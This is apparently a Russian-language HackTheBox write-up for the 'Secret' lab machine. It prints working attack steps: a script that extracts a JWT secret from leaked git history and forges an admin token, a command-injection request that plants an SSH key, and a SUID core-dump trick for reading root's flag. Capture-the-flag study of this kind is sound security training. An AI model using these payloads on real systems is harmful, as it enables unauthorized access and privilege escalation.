# Secret [HTB Writeup]

## 1. Перечисление открытых портов

Начнем сканирование с помощью утилиты Nmap:

~~~
root@localhost:~# ports=$(nmap -p- --min-rate=1000 -T4 secret.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@localhost:~# nmap -p $ports -sC -sV secret.htb -o secret.nmap
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-24 21:46 EET
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DUMB Docs
|_http-server-header: nginx/1.18.0 (Ubuntu)
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.40 seconds
~~~

Видим, что запущен сервис на порту 3000. Проверим, что там находится. Зарегистрируем пользователя в системе, как описано в мануале на сайте.

~~~
root@localhost:~# curl -X POST http://secret.htb:3000/api/user/register -H 'Content-Type: application/json' -d '{"name": "xxxxxx", "email": "xxxxxx@gmail.com", "password": "1234567890"}'
~~~

Логинимся от имени этого пользователя и получаем его токен аутентефикации.

~~~
root@localhost:~# curl -X POST http://secret.htb:3000/api/user/login -H 'Content-Type: application/json' -d '{"email": "xxxxxx@gmail.com", "password": "1234567890"}'
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWVmMDZmMmFmZGUyMzA0NWZmMzY3ZWMiLCJuYW1lIjoieHh4eHh4IiwiZW1haWwiOiJ4eHh4eHhAZ21haWwuY29tIiwiaWF0IjoxNjQzMDU0ODc0fQ.2OS-0MdwV-pvJSl4JMlMFXctC1hxWKXcyZlC1yp95JY
~~~

Находим некий архив files.zip(Скорее всего бэкап). Скачиваем архив и находим секрет в одной из папок архива.

~~~
#!/bin/bash

if [ -f ./files.zip ];
then
    echo "File exist";
else
    wget http://secret.htb/download/files.zip;
fi

if [ -e ./local-web ];
then
    echo "Files unpacked";
else
    unzip files.zip;
fi

cd ./local-web/;
cat .git/logs/refs/heads/master | awk '{print $2}' | 
while read commit;
do
    if git ls-tree $commit | sed -n 1p | grep ".env";
    then
        h=$(git ls-tree $commit | sed -n 1p | awk '{print $3}')
        if git cat-file -p $h | grep "TOKEN_SECRET = secret";
        then
            continue
        else
            #secret: "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE"
            echo "SECRET TOKEN: $(git cat-file -p $h | sed -n 2p | cut -d' ' -f3)";
            break
        fi
    fi
done
~~~

# Пользователь №1 (dasith)

## 2. Модификация токена. Получение прав администратора

Теперь мы можем модифицировать наш jwt токен на токен админа(пользователь theadmin).
Вставим эти данные в форму на сайте https://jwt.io/

~~~
{
  "alg": "HS256",
  "typ": "JWT"
}
{
  "_id": "61ef0b95afde23045ff367f1",
  "name": "theadmin",
  "email": "theadmin",
  "iat": 1643056043
}
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
)
~~~

Или же можем сделать все вручную. Для этого я написал небольшую программу-эксплойт.

~~~
#!/bin/bash

if [ -z ./files.zip ];
then
    wget http://secret.htb/download/files.zip 2>&1 | grep -v "." | tr "\n" "\r";
fi

if [ -z ./local-web ];
then
    unzip files.zip;
fi

cd ./local-web/;
cat .git/logs/refs/heads/master | awk '{print $2}' | 
while read commit;
do
    if [[ `git ls-tree $commit | sed -n 1p | grep -c ".env"` == 1 ]];
    then
        h=$(git ls-tree $commit | sed -n 1p | awk '{print $3}')
        if git cat-file -p $h | grep "TOKEN_SECRET = secret";
        then
            continue
        else
            #secret: "gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE"
            secret=$(git cat-file -p $h | sed -n 2p | cut -d' ' -f3);

            # Register user
      curl -X POST http://secret.htb:3000/api/user/register -H 'Content-Type: application/json' -d '{"name": "xxxxxx", "email": "xxxxxx@gmail.com", "password": "1234567890"}' 2>&1 | grep -v "."

      # Login user and get user_token
      user_token=$(curl -X POST http://secret.htb:3000/api/user/login -H 'Content-Type: application/json' -d '{"email": "xxxxxx@gmail.com", "password": "1234567890"}' 2>&1 | tail -1)

      # Modify user_token
      payload=$(echo $(echo $user_token | cut -d '.' -f2 | openssl base64 -d -A) | tr "\n" "}" | sed 's/\}\}/\}/' | sed 's/xxxxxx\@gmail\.com/theadmin/' | sed 's/xxxxxx/theadmin/' | base64 -w0 | sed 's/\+/-/' | sed -E 's/=+$//')
      head_payload=$(echo -n "$(echo -n $user_token | cut -d '.' -f1).$payload")
      signature=$(echo -n "$head_payload" | openssl dgst -binary -sha256 -hmac "$secret" | base64 -w0 | sed 's/\+/-/g' | sed 's/\//_/g' | sed -E 's/=+$//')
      admin_token="$head_payload.$signature"

      echo "[+] Token is modified!"
      echo "Token: $admin_token"
~~~

И получаем наш долгожданный токен админа. Проверяем.

~~~
root@localhost:~# curl http://secret.htb:3000/api/priv -X GET -H 'auth-token: <admin-token>'
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
~~~

Изучаем файлы в нашей директории local-web/routes. А именно нас интересует файл private.js. Там находим кое-что интересное.

~~~ js
...
if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
~~~

У нас есть возможность обойти это и вызвать произвольную команду, а именно получить обратный шелл, или же записать свой публичный ключ в файл /home/dasith/.ssh/authorized_keys. Для начала кодируем публичный ключ в base64 формат, затем преобразовываем полезную нагрузку в URL-code формат.

~~~
root@localhost:~# curl "http://secret.htb:3000/api/logs?file=/etc/passwd%3Becho%20%27c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FDdHBCMkpxOFNwcFB3Nm5yVTVGSmVHUDkrM00xSmJyVGZpMGdoT1Zheit6SlF0U253aVpoZXVmT043MlVqRDFlSVNqaDh3YTMvMXNQR1Jpeng0bVJiSEQzUnNxSkhKNzRkTWFXZU9UU3oyeEtkalo3a0tta1YrUWE1YmRZamVMTzkrNWVwQ2d0cnhpbGQvQldVZDZNRm1XSTBSOXhweko2MUR1VFlQd3dIcW5wS0F3c3dlK295S0VZSzArenNHeFlURXRmRXNReDNtcXlpakFKUGg2aUk4WEpSWW5ERzd5UGdwdGFRbnYzeXhRWHFrRjFGMzNIZWdZZG5BN3NUaWlYN0RCdW9wd0VUMDJhRS9OZWpVbktRcXl3cjM2aGIrZFBLVFkvTzhiRXRGS3FMb2V2WS9QVWlpa0JwQmo5eG4xSUhGM2M0c2F2QjRwUFpFcFVDejdYb3NJVFhnY0RKSGE2cDdZWklva3RmeFhkTXRjUDI1TG1xMlhCZFJ2cjluc2hMeWlVZ2VhL3daa2h4SlNhZFcxcndOK1BYYTUzeTN5NEpmU3prNFhkK2NkR0hobkF2aUVIMGxsT2dKVG5XVGhyRjVwTkdWVHRXSlgyNE8rcHY5Z1B5VUN3LzZQNmR0R2EvVDNsMlp1bEZJSFd6b3duOCs3ckV3SUx1RGc0aDR2Yk09IHJvb3RAcHQtbGludXgK%27%7Cbase64%20-d%20%3E%2Fhome%2Fdasith%2F.ssh%2Fauthorized_keys" -X GET -H 'auth-token: <admin-token>'
~~~

Забираем флаг! :)

~~~
root@localhost:~# ssh -i ./key dasith@secret.htb
dasith@secret:~$ cat user.txt
44f4945b531484f02785e47dd51eb405
~~~

# Пользователь №2 (root)

## 3. Локальное перечисление SUID файлов

Давайте запустим сканирование двоичных SUID файлов.

~~~
dasith@secret:~$ ls -la `find / -user root -perm -4000 -o -perm -2000` 2>&1 | grep -v "find:"
...
-rwsr-xr-x 1 root root 17824 Oct  7 10:03 /opt/count
...
dasith@secret:~$ cd /opt;ls -la
total 56
drwxr-xr-x  2 root root  4096 Oct  7 10:06 .
drwxr-xr-x 20 root root  4096 Oct  7 15:01 ..
-rw-r--r--  1 root root 16384 Oct  7 10:01 .code.c.swp
-rw-r--r--  1 root root  3736 Oct  7 10:01 code.c
-rwsr-xr-x  1 root root 17824 Oct  7 10:03 count
-rw-r--r--  1 root root  4622 Oct  7 10:04 valgrind.log
~~~

Давайте посмотрим на исходный код файла count

~~~c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/limits.h>

void dircount(const char *path, char *summary)
{
    DIR *dir;
    char fullpath[PATH_MAX];
    struct dirent *ent;
    struct stat fstat;

    int tot = 0, regular_files = 0, directories = 0, symlinks = 0;

    if((dir = opendir(path)) == NULL)
    {
        printf("\nUnable to open directory.\n");
        exit(EXIT_FAILURE);
    }
    while ((ent = readdir(dir)) != NULL)
    {
        ++tot;
        strncpy(fullpath, path, PATH_MAX-NAME_MAX-1);
        strcat(fullpath, "/");
        strncat(fullpath, ent->d_name, strlen(ent->d_name));
        if (!lstat(fullpath, &fstat))
        {
            if(S_ISDIR(fstat.st_mode))
            {
                printf("d");
                ++directories;
            }
            else if(S_ISLNK(fstat.st_mode))
            {
                printf("l");
                ++symlinks;
            }
            else if(S_ISREG(fstat.st_mode))
            {
                printf("-");
                ++regular_files;
            }
            else printf("?");
            printf((fstat.st_mode & S_IRUSR) ? "r" : "-");
            printf((fstat.st_mode & S_IWUSR) ? "w" : "-");
            printf((fstat.st_mode & S_IXUSR) ? "x" : "-");
            printf((fstat.st_mode & S_IRGRP) ? "r" : "-");
            printf((fstat.st_mode & S_IWGRP) ? "w" : "-");
            printf((fstat.st_mode & S_IXGRP) ? "x" : "-");
            printf((fstat.st_mode & S_IROTH) ? "r" : "-");
            printf((fstat.st_mode & S_IWOTH) ? "w" : "-");
            printf((fstat.st_mode & S_IXOTH) ? "x" : "-");
        }
        else
        {
            printf("??????????");
        }
        printf ("\t%s\n", ent->d_name);
    }
    closedir(dir);

    snprintf(summary, 4096, "Total entries       = %d\nRegular files       = %d\nDirectories         = %d\nSymbolic links      = %d\n", tot, regular_files, directories, symlinks);
    printf("\n%s", summary);
}


void filecount(const char *path, char *summary)
{
    FILE *file;
    char ch;
    int characters, words, lines;

    file = fopen(path, "r");

    if (file == NULL)
    {
        printf("\nUnable to open file.\n");
        printf("Please check if file exists and you have read privilege.\n");
        exit(EXIT_FAILURE);
    }

    characters = words = lines = 0;
    while ((ch = fgetc(file)) != EOF)
    {
        characters++;
        if (ch == '\n' || ch == '\0')
            lines++;
        if (ch == ' ' || ch == '\t' || ch == '\n' || ch == '\0')
            words++;
    }

    if (characters > 0)
    {
        words++;
        lines++;
    }

    snprintf(summary, 256, "Total characters = %d\nTotal words      = %d\nTotal lines      = %d\n", characters, words, lines);
    printf("\n%s", summary);
}


int main()
{
    char path[100];
    int res;
    struct stat path_s;
    char summary[4096];

    printf("Enter source file/directory name: ");
    scanf("%99s", path);
    getchar();
    stat(path, &path_s);
    if(S_ISDIR(path_s.st_mode))
        dircount(path, summary);
    else
        filecount(path, summary);

    // drop privs to limit file write
    setuid(getuid());
    // Enable coredump generation
    prctl(PR_SET_DUMPABLE, 1);
    printf("Save results a file? [y/N]: ");
    res = getchar();
    if (res == 121 || res == 89) {
        printf("Path: ");
        scanf("%99s", path);
        FILE *fp = fopen(path, "a");
        if (fp != NULL) {
            fputs(summary, fp);
            fclose(fp);
        } else {
            printf("Could not open %s for writing\n", path);
        }
    }

    return 0;
}
~~~

Видим, что в функции filecount, файл открывается на чтение и сохраняется в переменную file. После чего проверяется если переменная file == NULL, тогда нам говорят, что либо файл не существует, либо у нас нет превилегий к этому файлу. Но поскольку скомпилированный двоичный файл count имеет превилегии root (user and group), то мы можем открыть любой файл в системе, так как мы будем действовать от пользователя root.
А теперь самое интересное. Как прочитать содержимое файла, если нам выводится только количество символов, слов и строк файла? Однако это оказалось довольно просто...

## 4. Эксплуатация

Мы можем приостановить работу программы, в тот момент когда она спрашивает у нас сохранить ли ей отчет или нет, а потом убить процесс, так чтобы образовался дамп ядра.

~~~
dasith@seret:/opt$ ./count
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: ^Z
[1]+  Stopped                 ./count
dasith@secret:/opt$ ps axu | grep count
dasith      3470  0.0  0.0   2488   524 pts/0    T    09:16   0:00 ./count
dasith@secret:/opt$ kill -BUS 3470
dasith@secret:/opt$ fg
./count
Bus error (core dumped)
dasith@secret:/opt$ ls -la /var/crash
-rw-r-----  1 dasith dasith  28198 Jan 28 09:19 _opt_count.1000.crash
dasith@secret:/opt$ mkdir /tmp/crash;cd /var/crash
dasith@secret:/var/crash$ apport-unpack ./_opt_count.1000.crash /tmp/crash
dasith@secret:/var/crash$ cd /tmp/crash; ls
Architecture  CrashCounter  DistroRelease   ExecutableTimestamp  ProcCmdline  ProcEnviron  ProcStatus  Uname       _LogindSession
CoreDump      Date          ExecutablePath  ProblemType          ProcCwd      ProcMaps     Signal      UserGroups
dasith@secret:/tmp/crash$ strings CoreDump
...
/root/root.txt
e036e7d1dd9d431c975dd63b7231b1b4
...
~~~

Забираем корневой флаг!
HappyHack :P
